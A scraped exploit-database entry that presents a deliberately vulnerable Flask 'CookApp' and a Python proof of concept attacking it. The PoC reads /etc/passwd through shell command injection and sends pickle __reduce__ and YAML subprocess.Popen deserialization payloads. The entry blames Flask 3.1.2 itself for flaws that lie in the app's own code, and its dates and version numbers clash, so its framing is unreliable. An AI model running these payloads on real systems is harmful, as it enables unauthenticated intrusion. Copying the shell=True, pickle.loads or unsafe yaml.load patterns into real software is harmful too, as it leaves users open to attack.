---
title: Flask 3.1.2 CookApp - Multiple - RCE-Unauthenticated-access
url: https://cxsecurity.com/issue/WLB-2025120005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-09
fetch_date: 2025-12-10T03:19:49.672887
---

# Flask 3.1.2 CookApp - Multiple - RCE-Unauthenticated-access

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Flask 3.1.2 CookApp - Multiple - RCE-Unauthenticated-access** **2025.12.09**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **High**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Flask 3.1.2 CookApp - Multiple - RCE-Unauthenticated-access
# Date: 2024-12-07
# Exploit Author: nu11secur1ty
# Vendor Homepage: https://flask.palletsprojects.com/
# Software Link: https://pypi.org/project/Flask/
# Version: 3.1.2
# Tested on: Linux (Ubuntu 22.04), Docker containers
# CVE: CVE-2025-55182
# Category: Remote Code Execution
# Platform: Python/Flask
1. Description
==============
A vulnerable Flask application (CookApp) contains multiple critical security
vulnerabilities that allow unauthenticated remote attackers to execute arbitrary
commands on the target system.
The application contains three distinct Remote Code Execution (RCE) vectors:
1. Command Injection via `/api/run` endpoint (CWE-78)
2. Pickle Deserialization RCE via `/api/load` endpoint (CWE-502)
3. YAML Deserialization RCE via `/api/yaml` endpoint (CWE-502)
CVSS 3.1 Score: 9.8 (CRITICAL)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
2. Vulnerable Code
==================
```python
# Vulnerable endpoint 1: Command Injection
@app.route("/api/run", methods=["POST"])
def run\_cmd():
cmd = request.json.get("cmd", "whoami")
# VULNERABLE: shell=True with user input
output = subprocess.check\_output(cmd, shell=True)
return {"output": output.decode()}
# Vulnerable endpoint 2: Pickle Deserialization
@app.route("/api/load", methods=["POST"])
def load():
data = request.get\_data()
# VULNERABLE: pickle.loads() with untrusted data
recipe = pickle.loads(data)
return {"status": "loaded", "recipe": str(recipe)}
# Vulnerable endpoint 3: YAML Deserialization
@app.route("/api/yaml", methods=["POST"])
def import\_yaml():
yaml\_data = request.data.decode()
# VULNERABLE: yaml.load() instead of yaml.safe\_load()
data = yaml.load(yaml\_data, Loader=yaml.Loader)
return {"data": str(data)}
[+]PoC:
```py
#!/usr/bin/env python3
# https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/2025/flask-3.0.0-RCE/PoC.py
# nu11secur1ty
import requests
import pickle
target = "http://vulnerable-host:5000"
# 1. Command Injection (simplest)
resp = requests.post(f"{target}/api/run", json={"cmd": "cat /etc/passwd"})
print("Command Injection Output:", resp.json().get('output', ''))
# 2. Pickle RCE
class RCE:
def \_\_reduce\_\_(self):
import os
return (os.system, ("id",))
payload = pickle.dumps(RCE())
resp = requests.post(f"{target}/api/load", data=payload)
print("Pickle RCE Status:", resp.status\_code)
# 3. YAML RCE
yaml\_payload = """!!python/object/apply:subprocess.Popen
- ["sh", "-c", "whoami"]"""
resp = requests.post(f"{target}/api/yaml", data=yaml\_payload)
print("YAML RCE Status:", resp.status\_code)
```
### Demo:
[href](https://www.patreon.com/posts/flask-3-1-2-rce-145264728)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top